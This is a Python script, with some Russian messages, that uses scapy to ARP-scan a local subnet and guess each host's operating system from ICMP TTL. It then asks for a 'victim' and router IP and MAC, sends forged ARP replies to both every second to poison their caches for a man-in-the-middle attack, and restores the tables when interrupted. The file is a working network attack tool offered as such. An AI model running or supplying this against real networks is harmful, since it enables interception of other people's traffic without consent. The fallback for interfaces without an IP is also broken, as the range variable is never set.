import time
import sys
from scapy.all import ARP, sendp, get_if_list, Ether, srp, ICMP, IP, sr1, conf, ltoa, get_if_addr

def scan_network_on_interface(interface):
    local_ip = get_if_addr(interface)
    if local_ip == "0.0.0.0" or not local_ip:
        print("[-] Не удалось получить IP-адрес для этого интерфейса. Используется дефолтный диапазон.")
    else:
        ip_range = f"{local_ip.rsplit('.', 1)[0]}.0/24"
            
    def get_os_desc(ip):
        pkt = IP(dst=ip)/ICMP()
        resp = sr1(pkt, timeout=0.5, verbose=False)
        if resp and resp.haslayer(IP):
            ttl = resp.getlayer(IP).ttl
            if ttl <= 64:
                return "Linux/Android/iOS", "Unix-like OS"
            elif ttl <= 128:
                return "Windows", "Microsoft Windows OS"
        return "Unknown", "No response / Blocked by firewall"

    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp = ARP(pdst=ip_range)
    result, _ = srp(ether/arp, iface=interface, timeout=2, verbose=False)

    print("\nDiscovered devices:")
    discovered = []
    for index, (sent, received) in enumerate(result, start=1):
        os_name, desc = get_os_desc(received.psrc)
        print(f"{index}. IP: {received.psrc} | MAC: {received.hwsrc} | OS: {os_name} | Desc: {desc}")
        discovered.append({"ip": received.psrc, "mac": received.hwsrc})
        
    return discovered

def spoof(target_ip, target_mac, spoof_ip, interface = None):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)


    if interface:
        sendp(packet, iface=interface, verbose=False)
    else:
        sendp(packet, verbose=False)

interfaces = get_if_list()
print("Choose your interface:")
for i, iface in enumerate(interfaces):
    print(f"{i}. {iface}")
choice = int(input("Choose interface number:"))
selected_interface = interfaces[choice]

def restore(destination_ip, destination_mac, source_ip, source_mac, interface=None):
    packet = Ether(dst=destination_mac) / ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    if interface:
        sendp(packet, iface=interface, count=4, verbose=False)
    else:
        sendp(packet, count=4, verbose=False)

scan_network_on_interface(selected_interface)

print("\n--- Network Configuration ---")
victim_ip = input("Enter Victim IP: ")
victim_mac = input("Enter Victim MAC: ")
router_ip = input("Enter Router IP: ")
router_mac = input("Enter Router MAC: ")

try:
    while True:
        spoof(victim_ip, victim_mac, router_ip, selected_interface)
        spoof(router_ip, router_mac, victim_ip, selected_interface)
        time.sleep(1)
except KeyboardInterrupt:

    print("\n[*] Stopping spoofing... Restoring network tables...")
    restore(victim_ip, victim_mac, router_ip, router_mac, selected_interface)
    restore(router_ip, router_mac, victim_ip, victim_mac, selected_interface)
    
    print("[+] Network tables restored. Exiting successfully.")
